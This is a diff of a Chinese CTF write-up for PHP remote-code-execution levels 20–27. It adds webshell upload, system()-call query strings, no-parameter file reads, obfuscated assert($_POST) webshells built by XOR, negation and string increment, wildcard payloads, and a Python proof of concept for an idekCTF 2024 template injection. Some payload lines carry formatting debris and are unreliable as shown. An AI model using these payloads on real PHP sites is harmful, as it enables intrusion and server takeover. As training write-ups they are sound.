@@ -700,18 +700,130 @@ Level 19 : 文件写入导致的RCE
 
 Level 20 : 文件上传导致的RCE 
 
+没有做任何waf 直接上传webshell执行命令即可
+
+![image-20241012101025925](C:\Users\右京\AppData\Roaming\Typora\typora-user-images\image-20241012101025925.png)
+
 Level 21 : 文件包含导致的RCE 
+
+
 
 Level 22 : PHP 特性 - 动态调用 
 
-Level 23 : PHP 特性 - 自增 
+?a=system&b=cat /flag
+
+Level 23 : PHP 特性 - 自增
+
+ 
 
 Level 24 : PHP 特性 - 无参命令执行 
 
+?code=var_dump(scandir(current(localeconv())));
+
+得到数组array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(12) "get_flag.php" [4]=> string(9) "index.php" [5]=> string(7) "uploads" } 
+
+?code=show_source(array_rand(array_flip(scandir(current(localeconv())))));
+
+`array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`是随机返回一个数组,多刷新几次就出来了
+
 Level 25 : PHP 特性 - 取反绕过 
+
+上一题的payload，反转完了多刷新几次就得到了get_flag.php
 
 Level 26 : PHP 特性 - 无字母数字的代码执行
 
+两种解法
+
+第一种是异或
+
+$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); 
+$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); 
+$___=$$__;
+$_($___[_]);//assert($_POST[_]);
+
+或者
+
+$_ = "!((%)("^"@[[@[\\";   $__ = "!+/(("^"~{`{|";   $___ = $$__;   $_($___[_]); 
+
+第二种是取反
+
+$_ = ~"%9e%8c%8c%9a%8d%8b";   //得到assert，此时$_="assert"_
+
+_$__ = ~"%a0%af%b0%ac%ab";   //得到_POST，此时$__="_POST"___
+
+___$___ = $$__;   //$___=$_POST_
+
+_$_($___[_]); 
+
+方法三:自增自减
+
+```
+<?php
+$_=[].'';   //得到"Array"
+$___ = $_[$__];   //得到"A"，$__没有定义，默认为False也即0，此时$___="A"
+$__ = $___;   //$__="A"
+$_ = $___;   //$_="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$___ .= $__;   //$___="AS"
+$___ .= $__;   //$___="ASS"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;   //得到"E"，此时$__="E"
+$___ .= $__;   //$___="ASSE"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__;$__++;   //得到"R"，此时$__="R"
+$___ .= $__;   //$___="ASSER"
+$__++;$__++;   //得到"T"，此时$__="T"
+$___ .= $__;   //$___="ASSERT"
+$__ = $_;   //$__="A"
+$____ = "_";   //$____="_"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"P"，此时$__="P"
+$____ .= $__;   //$____="_P"
+$__ = $_;   //$__="A"
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;   //得到"O"，此时$__="O"
+$____ .= $__;   //$____="_PO"
+$__++;$__++;$__++;$__++;   //得到"S"，此时$__="S"
+$____ .= $__;   //$____="_POS"
+$__++;   //得到"T"，此时$__="T"
+$____ .= $__;   //$____="_POST"
+$_ = $$____;   //$_=$_POST
+$___($_[_]);   //ASSERT($POST[_])
+```
+
+方法四：通配符（本题不可行）
+
+```
+code=?><?=`??? ???`?>
+```
+
+code=?><?=`??? ???/???/????/???_????.???`?>
+
+都抓不到flag 或者get_flag.php
+
 Level 27 : PHP - 模板注入导致的RCE
 
+idekctf 2024 [idekCTF 2024 报道 - Hamayan Hamayan](https://blog.hamayanhamayan.com/entry/2024/08/20/092636)
 
+偷的别人的poc[Idek ctf 2024 网络文章（后续） (zenn.dev)](https://zenn.dev/tchen/articles/83f26ca77948fa)
+
+import hashlib
+import requests
+from urllib.parse import quote
+
+URL = "填你自己的"
+cwd = '/app'
+
+
+
+target_file = '../{Closure::fromCallable(system)->__invoke("cat /flag-*")}/../../pages/about'
+w1 = requests.get(URL + "?page=" + quote(target_file))
+print(w1.status_code)
+print(w1.text)
+
+
+
+filehash = hashlib.sha1(f"//{cwd}/pages/{target_file}{cwd}/templates/".encode())
+template_c_file = filehash.hexdigest() + "_0.file_" + target_file.split("/")[-1] + ".php"
+template_c_file_path = "../templates_c/" + template_c_file
+
+w2 = requests.get(URL + "?page=" + template_c_file_path)
+print(w2.status_code)
+print(w2.text)
